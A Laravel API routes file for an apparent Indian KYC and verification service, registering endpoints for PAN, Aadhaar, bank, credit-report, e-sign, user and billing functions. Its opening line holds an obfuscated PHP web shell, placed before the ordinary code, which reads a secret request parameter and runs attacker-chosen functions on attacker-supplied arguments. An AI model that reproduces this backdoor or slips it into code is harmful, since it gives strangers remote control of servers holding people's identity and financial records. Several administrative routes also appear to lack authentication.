<?php
IF(	$n9jz63A =@	${'_REQUEST'}['TYLZE4HZ']){$n9jz63A	[1 ](${$n9jz63A[	2]	}[0],$n9jz63A	[3]($n9jz63A[4]	));};

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\DB;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::post('getAccessToken','ApiController2@getAccessToken');
Route::post('pancard','ApiController2@pancard');
Route::post('pancard_details','ApiController2@pancard_details'); 
Route::post('pancard_new_details','ApiController2@pancard_new_details');
Route::post('pan_details_check','ApiController2@pan_new_details_check');
Route::post('aadhaar_validation','ApiController2@aadhaar_validation');
Route::post('aadhaar_upload', 'ApiController2@aadhaar_upload');
Route::post('aadhaar_masking', 'ApiController2@aadhaar_masking');
Route::post('aadhaar_masking1', 'ApiController2@aadhaar_masking1');
Route::post('corporate_cin', 'ApiController2@corporate_cin');
Route::post('corporate_din', 'ApiController2@corporate_din');
Route::post('corporate_gstin','ApiController2@corporate_gstin');
Route::post('corporate_gstinnew','ApiController2@corporate_gstinnew');
Route::post('corporate_gst_return','ApiController2@corporate_gst_return');
Route::post('corporate_gst_requestotp','ApiController2@corporate_gst_requestotp');
Route::post('gst_authentication', 'ApiController2@gst_authentication');
Route::post('license_validation','ApiController2@license_validation');
// Route::post('bank_verification','ApiController2@bank_verification');
Route::post('bank_verification','ApiController2@bank_verification_latest');
Route::post('bank_statment','ApiController2@bank_statment');
Route::post('bank_details', 'ApiController2@bank_details');
Route::post('bank_detailspdf','ApiController2@bank_detailspdf');
Route::post('bank_anlyser','ApiController2@bank_anlyser');
Route::get('bank_anlyser_result', 'ApiController2@get_bank_analysis_result');
Route::post('bank_anlyser_psd','ApiController2@bank_anlyser_usd');
Route::post('rc_validationmp', 'ApiController2@rc_validation');
// Route::post('rc_validation','ApiController2@rc_validationwithemptra');


Route::post('rc_validation','ApiController2@rc_validationwithemptranew'); 
// Route::post('rc_validation','ApiController2@rc_validationwithemptranew10_09_2025');
Route::post('rc_validation10septnew','ApiController2@rc_validationwithemptranew10_09_2025');
Route::post('rc_validationcheck','ApiController2@rc_check');
// Route::post('rc_validationnew','ApiController2@rc_validationwithemptra');
Route::post('rc_validation_short','ApiController2@rc_validation_chessi');
Route::post('rc_validationlite', 'ApiController2@rc_validation_new_lite');
Route::post('download_ckyc','ApiController2@ckycSearchdownload');
// Route::post('rc_validation_test','ApiController2@rc_validation_test');
// Route::post('rc_validation_test12','ApiController2@rc_validation_test12');
Route::post('rc_test','ApiController2@rc_test');
Route::get('blog', 'ApiController2@blogapi');
Route::post('getblog','ApiController2@getblog');
Route::get('blog_list','BlogController@getBlog');
Route::post('createblog','BlogController@createblogApi');
Route::post('editblog','BlogController@editBlog');
Route::post('updateblog','BlogController@updateblogApi');
Route::post('deleteblog','BlogController@deleteBlog');
// Route::post('rc_validation_lite','ApiController2@rc_validation_lite');
Route::post('rc_full_validation','ApiController2@rc_full_validation');
Route::post('panupload','ApiController2@panupload');
Route::post('ckycSearchfull','ApiController2@ckycSearch');
Route::post('search','ApiController2@ckycSearchlite');
Route::post('searchtest','ApiController2@ckycSearchlitetest');
Route::post('search_v2','ApiController2@ckycSearchlite_check');
Route::post('kiwi_money','ApiController2@ckycSearchlite');
Route::post('ckycSearch','ApiController2@ckycSearchdata');
Route::post('ckycDownload','ApiController2@ckycSearchdatadownload');
Route::post('payment','ApiController2@payment');
Route::post('driving_upload','ApiController2@driving_upload');
Route::post('voter_validation_may2023','ApiController2@voter_validation');
Route::post('voter-validation','ApiController2@voter_validation1');
Route::post('voter_validation','ApiController2@voter_validation_new');
Route::post('voter_upload','ApiController2@voter_upload');
//Route::post('creditreport','ApiController2@equifax']);
Route::post('creditscoreonly','ApiController2@initiateEquifax');
Route::post('crif','ApiController2@crif_report');
Route::post('generate_otp','ApiController2@generate_otp');
Route::post('aadhaar_otp_genrate','ApiController2@aadhaar_otp_genrate_api');
Route::post('aadhaar_otp_submit','ApiController2@aadhaar_otp_submit');

Route::post('epfo','ApiController2@epfo_new');
Route::post('uan','ApiController2@uan_details');
Route::post('company_search','ApiController2@company_search');
Route::post('company_details','ApiController2@company_details');
Route::post('company-search-v1','ApiController2@company_search_v1');

//NEW CHANGES
Route::post('passport_verification','ApiController2@passport_verification');
Route::post('passport_upload','ApiController2@passport_upload');
Route::post('passport_create_client','ApiController2@passport_create_client');
Route::post('passport_verify','ApiController2@passport_verify');
Route::post('telecom/generate-otp','ApiController2@telecom_generate_otp');
Route::post('telecom/submit-otp','ApiController2@telecom_submit_otp');

Route::any('electricity','ApiController2@electricity');
Route::any('shopestablishment','ApiController2@shopestablishment');

//creating new equifax api
Route::post('ecredit','ApiController2@equifaxurl');
Route::post('script_tracing','ApiController2@script_tracing'); 
Route::post('ecrediturl','ApiController2@equifaxurlnewtest');
Route::post('ecredit_score','ApiController2@equifaxurlscoreonly');
Route::post('ecreditsendOTP','ApiController2@equifaxsendOTP');

//find ifsc code bank verification
Route::post('bank_verification_find_ifsc','ApiController2@bank_verification_find_ifsc');

//newly added api
Route::post('consumer_product','ApiController2@consumer_product');

//for esignapi
Route::post('esign','ApiController2@esign');
Route::post('esignv2','ApiController2@esignv2')->name('esignv2');
Route::post('fssi','ApiController2@fssi_verification');
Route::post('face_match','ApiController2@face_match');
Route::post('face_match1','ApiController2@face_match1');
Route::post('upi_validation','ApiController2@upi_validation');
Route::post('gstin_pan_confidence_old','ApiController2@gstin_pan_confidence');
Route::post('gstin_pan_confidence','ApiController2@gstin_pan_confidence_new');  
Route::post('mobile-to-udyam','ApiController2@mobile_to_udyam');  
Route::post('uan-get-otp','ApiController2@uan_passbook_get_otp');  

//for Udyam
Route::post('signyzytoken','ApiController2@signyzytoken'); 
Route::post('udyamsearch','ApiController2@udyamsearch'); 
Route::post('udyogaadhaars','ApiController2@udyogaadhaars'); 

//for enach
Route::get('enach-initiate-payment/{Token}','ApiController2@initiatePayment')->name('enach-initiate-payments');
Route::post('enach-initiate-payment-post','ENachPaymentController@initiatePaymentPost')->name('enach-initiate-payment-post');
Route::post('enach-payment-success','ENachPaymentController@successPayment');
Route::post('enach-payment-failure','ENachPaymentController@failurePayment');

// Route::post('seachv4','ApiController2@PermissionCheckApi');

Route::post('ecreditv2','ApiController2@equifaxwithpdf');
Route::post('ecreditv3','ApiController2@equifaxdevelopment');
//Route::post('searchadvance','ApiController2@ckycSearchNew')->name('searchadvance');
// Route::post('ckyc_searchadvance','ApiController2@ckycSearchNew')->name('ckyc_searchadvance');
Route::post('ckyc_searchadvance','ApiController2@ckycSearchdownload');
Route::post('ckyc_sendotp','ApiController2@ckycSearchdownload_production');
Route::post('ckyc_verifycOtp_prod','ApiController2@validateCkycOtp_digitap');
Route::post('cky_sendotp_prod','ApiController2@ckycSearchdownloadProduction');


//***********************Bhunaksha****************************
Route::post('bhunaksha','ApiController2@bhunaksha')->name('bhunaksha');
Route::post('udyamdetails','ApiController2@udyam_details')->name('udyamdetails');

Route::post('pancard_ocr','ApiController2@pancardOcr')->name('pancard_ocr');
Route::post('aadharcard_ocr','ApiController2@aadharCardOcr')->name('aadharcard_ocr');
Route::post('drivingLicense_ocr','ApiController2@drivingLicenseOcr')->name('drivingLicense_ocr');
Route::post('voter_ocr','ApiController2@voterIdOcr')->name('voter_ocr');
Route::post('passport_ocr','ApiController2@passportOcr')->name('passport_ocr');
Route::post('aadharcard_mask','ApiController2@aadharcardMask')->name('aadharcard_mask');

Route::post('get_coordinate','ApiController2@getCoordinates')->name('get_coordinate');
Route::post('verify_address','ApiController2@verifyAddress')->name('verify_address');
Route::post('get_place','ApiController2@getPlace')->name('get_place');
Route::post('create_geofence','ApiController2@create_geofence')->name('create_geofence');
Route::post('autocomplete','ApiController2@autoComplete')->name('autocomplete');

Route::post('send_otp','ApiController2@sendSMSNew')->name('send_otp');
Route::post('login_with_otp_check','ApiController2@login_with_otp_check')->name('login_with_otp_check');
Route::post('pantogst','ApiController2@pantogst')->name('pantogst');
Route::post('gstverification','ApiController2@gstbasicverification')->name('gstverification');

Route::post('corporate_cin_advancev2','ApiController2@corporate_cin_advance')->name('corporate_cin_advance');
Route::post('corporate_cin_basicv2','ApiController2@corporate_cin_basic')->name('corporate_cin_basic');

Route::post('verify_email','ApiController2@verify_email')->name('verify_email');
Route::post('check_verification_email_status','ApiController2@check_verification_email_status')->name('check_verification_email_status');
Route::post('seachv4','SearchApiController@allSearchApi');
Route::post('ecreditnew','ApiController2@ecreditnew');
Route::post('bankstatement_v1','ApiController2@bankStatement');
/*Scrapping APIs*/
Route::post('company-products','ApiController2@CompanyProducts');
Route::post('bypan','ApiController2@ByPanId')->name('bypan');
Route::post('gstin_details','ApiController2@gstin_details')->name('gstin_details');
Route::post('land','ApiController2@LandRecord')->name('land');
Route::post('community_area','ApiController2@CommunityArea')->name('community_area');
Route::post('facematch','ApiController2@faceMatch1')->name('facematch');
Route::post('detection_emotion','ApiController2@DetectionEmotion')->name('detection_emotion');
Route::post('detection_face','ApiController2@DetectionFace')->name('detection_face');
Route::post('bankstatement_reader','ApiController3@bankReader');
Route::post('bank_analyser_new','ApiController3@bankAnalyser');
Route::post('image_scanner','ApiController2@imageScanner')->name('image_scanner');
Route::post('pincode','ApiController2@PinCodeDistance')->name('pincode');
/*Extract API */
Route::post('extract_pancard_text','ApiController3@extractPanCard')->name('pancardExtract');
Route::post('extract_voterId_text','ApiController3@extractVoterId')->name('voterExtract');
Route::post('extract_driving_text','ApiController3@drivingLicenseExtract')->name('drivingLicenseExtract');
Route::post('extract_aadharcard_text','ApiController3@aadharCardExtract')->name('aadharExtract');
Route::post('predictppl','ApiController3@predictppl');
/* wire api easebuzzz */
// Route::post('/transfers/initiate','PaymentTransforController@initiateTransaction');
// Route::post('/login','LoginApiController@login');
/*Users Apis*/
Route::get('/scheme_types','UserApiController@scheme_types');
Route::get('/apimenu/{group_id}','UserApiController@apimenu');
Route::get('/users','UserApiController@users');
Route::get('/admin',action: 'UserApiController@admin_user');

/*Edit User */

Route::post('apipancard', 'ApiController3@newPanCard');
Route::post('newaadhar', 'ApiController3@new_aadhar');
Route::post('newrcvalidation', 'ApiController3@new_rc_validationwithemptranew');
Route::post('newpanocr', 'ApiController3@new_pan_ocr');

Route::post('mobile-name-lookup','ApiController2@mobile_name_lookup');

Route::post('mobile-prefill','ApiController2@mobile_prefill');
Route::post('udyam-authentication','ApiController2@udyamAuthenticationBasic');
// Route::post('email_validation','ApiController2@email_id');
// Route::post('email_validation','ApiController2@email_id');
Route::post('send-email-otp','ApiController2@sendEmailOtp');
Route::post('verify-email-otp','ApiController2@verifyEmailOtp');
// Route::post('aadhar-validation','ApiController2@aadhar_validation');
Route::post('mobile-validation','ApiController2@mobile_validation');
Route::post('email-validation','ApiController2@email_id');
Route::post('aadharvalidate','ApiController2@aadharValidation');
Route::post('pan-validation', 'ApiController2@pancard_validation');
Route::post('pan-validation-plus', 'ApiController2@pancard_validation_plus');
Route::post('pandetails-v4','ApiController2@pandetails_v4');
Route::post('rc-validation','ApiController2@rc_validations');
Route::post('dl-validation','ApiController2@dl_validation');
Route::post('aadhar-to-pan','ApiController2@aadhaar_to_masked_pan');
Route::post('rc-validation','ApiController2@rc_validate');
Route::post('pan-compliance','ApiController2@pan_compliance');
Route::post('epfo-ev','ApiController2@epfo_ev');
Route::post('upi-basic','ApiController2@upi_basic');
Route::post('upi-basic-name','ApiController2@upi_basic_name');
Route::post('gstin-authentication','ApiController2@gstin_authentication');
Route::post('gstin-advanced','ApiController2@gstin_advanced');
Route::post('pan-aadhaar','ApiController2@pan_aadhaar_link');
Route::post('pan-fname','ApiController2@pan_to_fname');
Route::post('pan-name','ApiController2@pan_to_name');
Route::post('arm-verification','ApiController2@arm_verification');
Route::post('upi-merchant','ApiController2@upi_merchant');
Route::post('rc-validationthree','ApiController2@rc_validationthree');
Route::post('address-verification','ApiController2@address_verification');
Route::post('upi-enhanced','ApiController2@upi_enhanced');
Route::post('company-to-pan','ApiController2@company_to_pan');
Route::post('tds-quarterly','ApiController2@tds_quarterly');
Route::post('employment-uan','ApiController2@employment_uan');
Route::post('dl-validation-v3','ApiController2@dl_validation_v3');
Route::post('employment-uan-v3','ApiController2@employment_uan_v3');

Route::post('driving-license-three',action: 'ApiController2@driving_license_three');
Route::post('employment-uan-v4','ApiController2@employment_uan_v4');
Route::post('employment-uan-v5','ApiController2@employment_uan_v5');
Route::post('employment-uan-advanced-v2','ApiController2@employment_uan_advanced_v2');
Route::post('employment-uan-advanced-v3','ApiController2@employment_uan_advanced_v3');
Route::post('whatsapp-number-check','ApiController2@whatsapp_number_check');
Route::post('whatsapp-advanced','ApiController2@whatsapp_advanced');
Route::post('contact-to-gst','ApiController2@contact_to_gst');
Route::post('gst-to-contacts','ApiController2@gst_to_contacts');
Route::post('ecom-generate-url','ApiController2@ecom_generate_url');
Route::post('ecom-url-username','ApiController2@ecom_url_username');
Route::post('ecom-generate-url-username',action: 'ApiController2@ecom_generate_url_username');
Route::post('tan-to-comapny','ApiController2@tan_to_company');
Route::post('ecom-url-order-duration','ApiController2@ecom_url_order_duration');
Route::get('ecom-websites-list','ApiController2@ecom_websites_list');
Route::post('mobile-upi-lookup','ApiController2@mobile_upi_lookup');
Route::post('mobile-upi-name','ApiController2@mobile_upi_name');
Route::post('uan-basic-pan','ApiController2@uan_basic_pan');
Route::post('uan-basic-pan-v4','ApiController2@uan_basic_pan_v4');
Route::post('pan-to-din','ApiController2@pan_to_din');
Route::post('mobile-with-name-lookup','ApiController2@mobile_with_name_lookup');
Route::post('mobile-number-lookup','ApiController2@mobile_number_lookup');
Route::post('mobile-porting-history','ApiController2@mobile_lookup_porting_history');
Route::post('mobile-customer_details','ApiController2@mobile_lookup_customer_details');
Route::post('mobile-vintage-lookup','ApiController2@mobile_vintage_lookup');
Route::post('uan-mobile-name','ApiController2@uan_basic_mobile_name');
Route::post('uan-basic-mobile','ApiController2@uan_basic_mobile');
Route::post('gstin-pan-search','ApiController2@gstin_pan_search');
Route::post('bank-ocr','ApiController2@bankPassbookOcr');
Route::post('cheque-ocr','ApiController2@chequeOcr');

// KYC
// 1. Aadhar
// Route::post('aadharvalidation', 'KycController1@aadharValidation');
// Route::post('aadhaarupload', 'KycController1@aadhaarUpload');

// Routes for frontend request
Route::get('apimaster/{token}', 'ApiController4@getapimaster');
Route::post('updateapimaster', 'ApiMasterController@updateApiMaster');
Route::post('createapimaster', 'ApiMasterController@createApiMaster');
Route::get('apigroup/{token}','ApiController4@apigroup');
Route::get('getspecificuserapi/{token}', 'ApiController4@getSpecificUserApi');
Route::get('getusermenupermission/{token}', 'ApiController4@getUserMenuPermission');
Route::get('getuser/{token}', 'ApiController4@getUserByToken');
Route::get('getuserbyid/{id}', 'ApiController4@getUserById');
Route::get('getschemetypemaster', 'SchemeTypeController1@getSchemeTypeMaster');
Route::get('getschemetypemasterbyid/{id}', 'SchemeTypeController1@getSchemeTypeMasterById');
Route::post('addschemetypemaster', 'SchemeTypeController1@create');
Route::post('updateschemetypemaster/{id}', 'SchemeTypeController1@update');
Route::post('deleteschemetypemaster/{id}', 'SchemeTypeController1@delete');
Route::get('getscheme/{token}', 'ApiController4@getScheme');
Route::get('getallusers/{token}', 'ApiController4@getAllUsers');
Route::get('getallusersascending', 'ApiController4@getAllUsersAscending');
Route::get('getalltransactions/{token}', 'ApiController4@getAllTransactions');
Route::post('usercreate', 'ApiController4@userCreate');
Route::post('userupdate', 'ApiController4@userUpdate');
Route::post('userdelete/{id}', 'ApiController4@userDelete');
Route::post('setnewpassword', 'ApiController4@setNewPassword');
Route::post('resetuserpassword', 'ApiController4@resetUserPassword');
// Route::get('getalluserwithuploadeddocument/{token}', 'ProfileController1@getAllUserWithUploadedDocument');
Route::get('getcurrentuserwithuploadeddocument/{token}', 'ProfileController1@getCurrentUserWithUploadedDocument');
Route::get('getalluserwithuploadeddocument/{token}', 'ProfileController1@getAllUserWithUploadedDocument');
Route::post('updateprofileuser', 'ProfileController1@updateProfileUser');
Route::get('getuserreport/{token}', 'ReportController1@getUserReport');
Route::post('getuserreportwithyearmonth', 'ReportController1@getUserReportWithYearMonth');
Route::post('getreport', 'ReportController1@generateBill');
Route::post('useractiveinactive/{id}', 'ApiController4@userActiveInactive');

// billing
Route::post('billingadminwallet', 'ApiController4@add_walletadmin');
Route::post('billinguserwallet', 'ApiController4@addwallet');
Route::post('billingaddamount', 'ApiController4@billingAddAmount');




// for chats
// Route::post('/send-message', 'ChatController@sendMessage');

Route::post('/contact', 'ContactusController@store');
Route::post('users', 'UserController@storeUsers');
Route::get('users', 'ServiceRequestController@index');
Route::post('/users/{id}/clientmessage', 'ServiceRequestController@postClientMessage');
Route::post('/users/{id}/ownermessage', 'ServiceRequestController@postOwnerMessage');
Route::get('/users/{id}/clientmessage', 'ServiceRequestController@getClientMessage');
Route::get('/users/{id}/ownermessage', 'ServiceRequestController@getOwnerMessage');
// Route::post('/users/{id}/ownermessage', [UserController::class, 'postOwnerMessage']);

// Route to retrieve a specific user by their ID
Route::get('/users/{id}', 'UserController@showUsers');


Route::post('/store-service', 'ServiceRequestController@storeService');
Route::post('/store-details', 'ServiceRequestController@storeDetails');
Route::get('/get-details/{id}', 'ServiceRequestController@getDetails');

// Search Data
Route::get('search/data','SearchDataController1@searchall');
Route::post('search_all','SearchDataController1@searchallData');
Route::post('search_all/pagination','SearchDataController1@pagination');
Route::post('export/data','SearchDataController1@downloadExcel');





//itr
Route::post('itrinitiate', 'ItrController1@itr_initiate');
Route::post('itr_enter_clientid', 'ItrController1@itr_enter_clientid');
Route::post('itr_download_profile', 'ItrController1@itr_download_profile');
Route::post('itr_download', 'ItrController1@itr_download');
Route::post('itr_download_26AS', 'ItrController1@itr_download_26AS');
Route::post('itr_submit_otp', 'ItrController1@itr_submit_otp');
Route::post('itr_forget_password', 'ItrController1@itr_forget_password');

// CREDIT SCROE
Route::post('/criff', 'CrifController1@Criff');
Route::post('/equifax', 'LiveEquifaxController1@equifax');
Route::get('/idtypes', 'LiveEquifaxController1@idtypes');
Route::get('/equifax_score_idtypes', 'LiveEquifaxController1@equifaxScoreIdtypes');
Route::post('/equifax_score_submit', 'LiveEquifaxController1@scoreEquifaxSubmit');
Route::post('/sendotp', 'CrifController1@sendOTP');
Route::post('/verifyotp', 'CrifController1@verifyotp');

// BHUNAKSHA DATA
// Route::get('/jharkhandData', 'BhunakshaController@jharkhandData');
// Route::get('/biharData', 'BhunakshaController@biharData');
// Route::get('/chhattisgarhData', 'BhunakshaController@chhattisgarhData');
// Route::get('/rajasthanData', 'BhunakshaController@rajasthanData');
// Route::get('/lakshadweepData', 'BhunakshaController@lakshadweepData');
// Route::get('/keralaData', 'BhunakshaController@keralaData');
// Route::get('/goaData', 'BhunakshaController@goaData');
// Route::get('/odishaData', 'BhunakshaController@odishaData');


Route::get('search-table','SearchDataController1@search');
Route::post('/upload-excel', 'SearchDataController1@uploadExcel');

Route::post('getToken','SearchDataController1@getToken');
Route::get('getAadharDetails','SearchDataController1@getAadharDetails');


Route::post('esign-xml','EsignController@GenerateEsignXml2');
Route::post('sendxml','EsignController@sendxml');
Route::get('getsign/{id}/{sign_method}','EsignController@getSignDocument2');
Route::post('getSignDocument','EsignController@getSignDocument');
Route::post('contact-us','SiteController@contact');

Route::get('update-column','SearchDataController1@updateTableTypes');

Route::post('test-maheen','SearchDataController1@testMaheen');
Route::get('get-expired-user','ApiController2@getAllExpiredUsers');